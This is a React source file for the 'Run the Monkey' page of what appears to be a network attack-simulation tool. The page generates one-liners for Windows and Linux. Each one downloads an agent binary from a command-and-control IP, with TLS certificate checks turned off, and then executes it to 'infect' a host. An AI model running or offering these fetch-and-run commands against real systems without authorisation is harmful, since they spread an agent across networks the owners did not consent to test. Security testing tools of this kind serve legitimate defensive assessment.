import React from 'react';
import {Button, Col, Well, Nav, NavItem} from 'react-bootstrap';
import CopyToClipboard from 'react-copy-to-clipboard';
import {Icon} from 'react-fa';
import {Link} from 'react-router-dom';

class RunMonkeyPageComponent extends React.Component {

  constructor(props) {
    super(props);
    this.state = {
      ips: [],
      selectedIp: '0.0.0.0',
      runningOnIslandState: 'not_running',
      runningOnClientState: 'not_running',
      selectedSection: 'windows-32'
    };
  }

  componentDidMount() {
    fetch('/api')
      .then(res => res.json())
      .then(res => this.setState({
        ips: res['ip_addresses']
      }));

    fetch('/api/local-monkey')
      .then(res => res.json())
      .then(res =>{
        if (res['is_running']) {
          this.setState({runningOnIslandState: 'running'});
        } else {
          this.setState({runningOnIslandState: 'not_running'});
        }
      });

    fetch('/api/client-monkey')
      .then(res => res.json())
      .then(res => {
        if (res['is_running']) {
          this.setState({runningOnClientState: 'running'});
        } else {
          this.setState({runningOnClientState: 'not_running'});
        }
      });

    this.props.onStatusChange();
  }

  generateLinuxCmd(ip, is32Bit) {
    let bitText = is32Bit ? '32' : '64';
    return `curl -O -k https://${ip}:5000/api/monkey/download/monkey-linux-${bitText}; chmod +x monkey-linux-${bitText}; ./monkey-linux-${bitText} m0nk3y -s ${ip}:5000`
  }

  generateWindowsCmd(ip, is32Bit) {
    let bitText = is32Bit ? '32' : '64';
    return `powershell [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object System.Net.WebClient).DownloadFile('https://${ip}:5000/api/monkey/download/monkey-windows-${bitText}.exe','.\\monkey.exe'); ;Start-Process -FilePath '.\\monkey.exe' -ArgumentList 'm0nk3y -s ${ip}:5000';`;
  }

  runLocalMonkey = () => {
    fetch('/api/local-monkey',
      {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({action: 'run'})
      })
      .then(res => res.json())
      .then(res => {
        if (res['is_running']) {
          this.setState({
            runningOnIslandState: 'installing'
          });
        } else {
          this.setState({
            runningOnIslandState: 'not_running'
          });
        }

        this.props.onStatusChange();
      });
  };

  generateCmdDiv(ip) {
    let isLinux = (this.state.selectedSection.split('-')[0] === 'linux');
    let is32Bit = (this.state.selectedSection.split('-')[1] === '32');
    let cmdText = '';
    if (isLinux) {
      cmdText = this.generateLinuxCmd(ip, is32Bit);
    } else {
      cmdText = this.generateWindowsCmd(ip, is32Bit);
    }
    return (
      <Well key={'cmdDiv'+ip} className="well-sm" style={{'margin': '0.5em'}}>
        <div style={{'overflow': 'auto', 'padding': '0.5em'}}>
          <CopyToClipboard text={cmdText} className="pull-right btn-sm">
            <Button style={{margin: '-0.5em'}} title="Copy to Clipboard">
              <Icon name="clipboard"/>
            </Button>
          </CopyToClipboard>
          <code>{cmdText}</code>
        </div>
      </Well>
    )
  }

  setSelectedSection = (key) => {
    this.setState({
      selectedSection: key
    });
  };

  renderIconByState(state) {
    if (state === 'running') {
      return <Icon name="check" className="text-success" style={{'marginLeft': '5px'}}/>
    } else if (state === 'installing') {
      return <Icon name="refresh" className="text-success" style={{'marginLeft': '5px'}}/>
    } else {
      return '';
    }
  }

  render() {
    return (
      <Col xs={12} lg={8}>
        <h1 className="page-title">Run the Monkey</h1>
        <p style={{'fontSize': '1.2em', 'marginBottom': '2em'}}>
          You can run the monkey on the C&C server, on your local machine and basically everywhere.
          The more the merrier &#x1F604;
        </p>
        <p style={{'marginBottom': '2em'}}>
          <button onClick={this.runLocalMonkey}
                  className="btn btn-default"
                  disabled={this.state.runningOnIslandState !== 'not_running'}>
            Run on C&C Server
            { this.renderIconByState(this.state.runningOnIslandState) }
          </button>
          {
            // TODO: implement button functionality
            /*
            <button
               className="btn btn-default"
               disabled={this.state.runningOnClientState !== 'not_running'}
               style={{'marginLeft': '1em'}}>
              Download and run locally
              { this.renderIconByState(this.state.runningOnClientState) }
            </button>
            */
          }
        </p>
        <div className="run-monkey-snippets" style={{'marginBottom': '3em'}}>
          <p>
            Run one of those snippets on a host for infecting it with a Monkey:
            <br/>
            <span className="text-muted">(The IP address is used as the monkey's C&C address)</span>
          </p>
          <Nav bsStyle="pills" justified
               activeKey={this.state.selectedSection} onSelect={this.setSelectedSection}
               style={{'marginBottom': '2em'}}>
            <NavItem key='windows-32' eventKey='windows-32'>Windows (32 bit)</NavItem>
            <NavItem key='windows-64' eventKey='windows-64'>Windows (64 bit)</NavItem>
            <NavItem key='linux-32' eventKey='linux-32'>Linux (32 bit)</NavItem>
            <NavItem key='linux-64' eventKey='linux-64'>Linux (64 bit)</NavItem>
          </Nav>
            {this.state.ips.map(ip => this.generateCmdDiv(ip))}
        </div>
        <p style={{'fontSize': '1.2em'}}>
          Go ahead and monitor the ongoing infection in the <Link to="/infection/map">Infection Map</Link> view.
        </p>
      </Col>
    );
  }
}

export default RunMonkeyPageComponent;
